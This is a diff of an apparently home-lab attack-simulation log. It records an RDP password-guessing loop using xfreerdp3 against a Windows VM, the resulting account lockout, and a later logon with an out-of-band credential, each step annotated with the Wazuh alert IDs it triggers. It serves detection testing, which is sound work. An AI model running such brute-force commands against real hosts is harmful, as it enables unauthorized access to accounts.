@@ -1,29 +1,26 @@
 # Scenario 04 — attacker-side output (brute force -> lockout -> valid-credential logon)
-# Run 2026-11-01 ~02:22-02:34 UTC. Condensed command/outcome record; password redacted.
+# Run 2026-11-01, Kali local timestamps shown (manager UTC is 02:22 / 02:34). Password REDACTED.
+# Repeated FreeRDP "/p is insecure" + TLS/Kerberos realm warning lines trimmed for readability.
 # Attacker: Kali 192.168.56.10   Target: DESKTOP-T0LOHB5 192.168.56.30   Account: Client (local admin)
 
-# ── T1110.001 — Brute Force: Password Guessing ──
-# +auth-only performs the NLA credential check only (a Type-3 network logon), no desktop,
-# so every wrong password is a clean, fast 4625.
+# ── T1110.001 — Brute Force: Password Guessing (+auth-only = NLA credential check only, Type-3) ──
 ┌──(kali㉿kali)-[~]
-└─$ for p in $(cat ~/winpass.txt); do xfreerdp3 /u:Client /p:"$p" /v:192.168.56.30 /cert:ignore +auth-only; done
+└─$ for pass in $(cat ~/winpass.txt); do xfreerdp3 /u:Client /p:"$pass" /v:192.168.56.30 /cert:ignore +auth-only; done
+[22:22:04:154] [ERROR][com.freerdp.core] - [nla_recv_pdu]: ERRCONNECT_LOGON_FAILURE [0x00020014]
+[22:22:04:202] [ERROR][com.freerdp.core] - [nla_recv_pdu]: ERRCONNECT_LOGON_FAILURE [0x00020014]
+[22:22:04:250] [ERROR][com.freerdp.core] - [nla_recv_pdu]: ERRCONNECT_LOGON_FAILURE [0x00020014]
+      ...   (9 failures from 192.168.56.10 — Wazuh 60122 x9; correlation 60204 at the 8th)
+[22:22:04:644] [ERROR][com.freerdp.core] - [nla_recv_pdu]: ERRCONNECT_ACCOUNT_LOCKED_OUT [0x00020018]
+[22:22:04:692] [ERROR][com.freerdp.core] - [nla_recv_pdu]: ERRCONNECT_ACCOUNT_LOCKED_OUT [0x00020018]
+      ...   (further attempts hit the locked account — Wazuh 60115. No access gained by guessing.)
 
-# every wrong password returned:
-[ERROR][com.freerdp.core] - [nla_recv_pdu]: ERRCONNECT_LOGON_FAILURE [0x00020014]
-#   -> 9 failures from 192.168.56.10 (Wazuh 60122 x9; correlation 60204 fired at the 8th, 02:22:04.496Z)
+# ── Lockout policy: net accounts 10 / 10 / 10 — waited out the ~10-minute window, then logged in ──
 
-# once the lockout threshold was crossed, further attempts returned:
-[ERROR][com.freerdp.core] - [nla_recv_pdu]: ERRCONNECT_ACCOUNT_LOCKED_OUT [0x00020018]
-#   -> account `Client` locked — Wazuh 60115 (02:22:04.594Z). The online guessing gained NO access.
-
-# ── Lockout policy: net accounts 10 / 10 / 10 ──
-# In the wild the attacker waits out the 10-minute lockout window; this run waited it out
-# (no ADSI shortcut), then logged in once it auto-expired.
-
-# ── T1078.003 / T1021.001 — valid-credential logon (credential obtained out-of-band) ──
+# ── T1078.003 / T1021.001 — valid-credential interactive logon (credential obtained out-of-band) ──
 # A real interactive session this time (no +auth-only) -> Type-10 logon.
 ┌──(kali㉿kali)-[~]
-└─$ xfreerdp3 /u:Client /p:"<REDACTED>" /v:192.168.56.30 /cert:ignore -clipboard
-#   -> successful NLA pre-auth: Wazuh 92657 (Type 3, logon 0x33f676, 02:34:04.630Z)
-#   -> interactive session:     Wazuh 92653 (Type 10, logon 0x34af4d <-> linked 0x34af73, 02:34:05.341Z)
+└─$ xfreerdp3 /u:Client /p:"<REDACTED>" /v:192.168.56.30 /cert:ignore
+[22:34:05:815] [INFO][com.freerdp.client.common] - [client_common_save_session_info]: Logon Info V2 [DESKTOP-T0LOHB5\Client [3]]
+#   -> interactive session established (session 3)
+#   -> Wazuh 92657 (NLA Type 3, logon 0x33f676) + 92653 (Type 10, logon 0x34af4d <-> linked 0x34af73)
 #   0x34af4d is the elevated token of the RDP session; the Scenario 05 dump runs under it.
